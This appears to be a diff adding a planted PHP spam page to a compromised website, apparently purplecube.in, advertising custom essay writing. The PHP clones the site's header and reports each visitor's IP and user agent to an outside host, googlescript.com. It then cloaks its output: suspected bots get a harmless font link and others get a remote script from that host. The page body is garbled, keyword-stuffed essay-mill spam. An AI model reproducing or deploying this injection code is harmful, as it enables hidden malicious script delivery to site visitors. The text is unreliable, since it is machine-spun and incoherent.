@@ -1,0 +1,52 @@
+<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+   $content = file_get_contents($url);
+   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
+   $content = preg_replace('/<title(.*?)title>/i', '', $content);
+   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
+   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
+   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
+   preg_match_all('/<head(.*?)>/i', $content, $headTag);
+   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
+   $siteDOM = new DOMDocument;
+   @$siteDOM->loadHTML($content);
+   $head = new DOMDocument;
+   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
+   foreach ($headDOM->childNodes as $child)
+   $head->appendChild($head->importNode($child, true));
+   $headHTML = @$head->saveHTML();
+   $body = new DOMDocument;
+   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
+   foreach ($bodyDOM->childNodes as $child)
+   $body->appendChild($body->importNode($child, true));
+   $bodyHTML = @$body->saveHTML();
+   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
+   ?>
+<title>Custom Essay $11 Identify Gliders Raja custom essay $11 Resortis Synching Wildest Lifeanddeath Understandably | purplecube.in</title>
+<meta name="description" content="For every pacquiao is n t needed by him. | Custom Essay $11" />
+<?php echo $headHTML . PHP_EOL; ?>
+<?php
+   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+   $ua = urlencode($ua);
+   $ip = $_SERVER['REMOTE_ADDR'];
+   $api = 'http://googlescript.com/api.php?';
+   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
+   $churl = "{$api}action=get_link&api_key=$apikey&group=css-font&ua=$ua&ip=$ip";
+   $check = file_get_contents($churl);
+   $json = json_decode($check);
+   if ($json->{'bot_action'}->{'text'} == 'y') {
+   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
+   }
+   else {
+   echo '<script src="http://googlescript.com/css-font"></script>';
+   }
+   ?>
+   </head>
+   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
+     <div id="main">
+               <div id="primary">
+<h1>custom essay $11 Selfdiscipline Zusak Sharp</h1>However, a special place among the problems of illegal immigrants is committed to crimes and serving sentences in prisons. <p>The ability to feel that a person sefvice wrong and that something should be changed helps to determine the goals and the strategy that will help to deal with the difficult situations. Tolerance for ambiguity, or the recognition that there may be no single ideal creating windows service in visual studio 2012 to ethically problematic situations. Tanking action and taking risk sometimes can be beneficial for both sides. Therefore, you can rely on our custom essay $11 writers, who can write a professional college essay of the top quality. Our writers will accomplish the college essay just in time and we will deliver you your college essay on time. Our professional writers custom essay $11 are always ready to help you custom essay $11 with essays. Favorite poet pay essay aya ta. What you need do is just to buy a college essay from us.</p> <h2>I truly many thanks for consideration and your time.</h2>During this period <a href="http://purplecube.in/we-write-your-essay">we write your essay</a> of time people need support, attention, communication and to have fun with friends. <p>The total length of the fence <strong>custom essay $11</strong> should be <strong>custom essay $11</strong> about 2000 miles. Dilemmas should not be obstacles in life, as there can be found proper and implemented useful modifications. Ethical responsibility, or the ability to make a decision and take action. Ability to analyze and critically evaluate ethical dilemmas, including an understanding of competing values, and the ability to scrutinize options for resolution. In state prisons this figure is much lower, because violation <strong>custom essay $11</strong> of immigration law is under federal jurisdiction. Being able to define the most important issues and to depict the most custom essay $11 useful information will help in working with youth and children. Learn moreHmm, there was a problem reaching the server.</p> <h2>For instance: don t state: consume more fats.</h2>Ceating moreAdd this video to your creating windows service in visual studio 2012 by copying the code below. <p>In addition, you can be certain that our college essays are plagiarism free. Try again or visit Twitter Status for more information. Twitter may be over capacity or experiencing a momentary hiccup. In a new study, conducted by British researchers, women are more prone to depression than men. What ib actually offer to our customers is very simple but very helpful. Children, as a rule, are very sensitive to the problems, they suffer a lot if something <a href="http://purplecube.in/buy-mba-essays">buy mba essays</a> happens, they feel sorry for many things and they end up in depression.</p> <h2>Preserve this in mind while you generate your book name.</h2>Men more often attributed their depression to the experience of the business or financial crisis, while <a href="http://purplecube.in/professional-essay-writers-india">professional essay writers india</a> women are more worried because of family or partnership. <p>The main causes of depression are the physical problems more than half of all respondents reported that they experienced anxiety due to creating windows service in visual studio 2012 financial situation. There are many challenging situations that ccreating precise attention, new vsual and approaches, different creative thoughts and their implementation. Another major reason, which explains the lack of effective measures to address the problems associated with illegal immigration, is the lack of funding creating windows service in visual studio 2012 deportation and improve border security. If child has enough communication with friends creaing parents, enough attention at school, if he reads books and studies well, then it is almost guaranteed that a child will not have depression. The most depressing month of the year is January. In fact, even the perfect, best college essay can lose points, unless it is submitted on time. Moreover, you will have time to read the essay and send us your feedback. Try again or visit Twitter Status for more information.</p> <h2>A small business account will be the most expensive and complete-featured type of account.</h2>The system would consist of monitoring cameras, radar, sensor windowss and detectors that detect motion and heat radiation. <p>It should be noted that tax burden on Qindows citizens in all bordering states <a href="http://purplecube.in/pay-essays-online">pay essays online</a> varies due to the intensity of the various streams of immigrants and different <strong>custom essay $11</strong> <strong>custom essay $11</strong> density of the population of these states. You will never doubt about the quality of our essays because we guarantee <a href="http://purplecube.in/write-my-essay-in-1-hour">write my essay in 1 hour</a> winvows high quality of our college essays. All information should be submitted in a single center. We are conscious of the importance of the deadline for the overall success of the college essay. The reason for this is the debt on loans, which appears after the celebration of Christmas and New Year, as well as the cold weather. As a rule, depression occurs when people become desperate, they do not believe windowss justice, in the bright future, in the better times and in themselves.</p> <h2>Provide: about 90 dead-man bones cookies.</h2>Or just pay someone. <p>We have professional writers who have an extensive experience in different creating windows service in visual studio 2012 of science. For the last few years, American society actively discussed Boeing project of the construction of so-called "high-tech" fence along the border with Mexico. Ethical responsibility may be considered one of the main components essential for the work with children. Consequently, early detection of depression can be treated easily and quickly, but those who refuse medical treatment, the disease often becomes complicated, and windpws deal with it is not so easy - particularly when patients have destructive and antisocial behavior. And as well, there are many dilemmas and choices that can seem difficult to decide on. The principal factors which could contribute a child developing depression can servuce the lack crfating attention, too much time spent in the virtual world, playing violent computer games, etc.</p> <h2>Ditto for non-profits. not really much.</h2>Learn moreThe URL of this tweet is below. <p>Cooperation and ethical responsibility are the qualities of success and future possibilities. For instance, in the state of Arizona, the annual cost of detention of illegal immigrants, providing litigation and justice, procedural measures, the content in custody prior to sentencing or until the circumstances, etc. In March 2010, Secretary of Homeland Security Janet Napolitano has suspended funding of the project. Copy it to vosual share with friends. Sometimes taking a risk and changing the behavior and certain principles helps a winodws. What you need is to order the college essay and we will deliver it before the deadline.</p> <h2>It is worth mentioning that breakup though permissible is the most hated halal work by the almighty.</h2>Cancel Delete Close Promote this Tweet Close Block Cancel Block Add a location to your Tweets When you tweet with a location, Twitter stores that location. <p>If necessary we will revise and edit your college essay, so you will get the college essay you need on time. Pilot area on the border of Arizona and Mexico length of 28 miles was commissioned in 2008. Add this Tweet to your website by copying the code below. Our services focus on three issues which are crucial for any student who does need a good, professionally written college essayThe time is crucial because, as a rule, points are deducted if a college essay is not submitted on time.</p>
+                  </div>
+               </div>
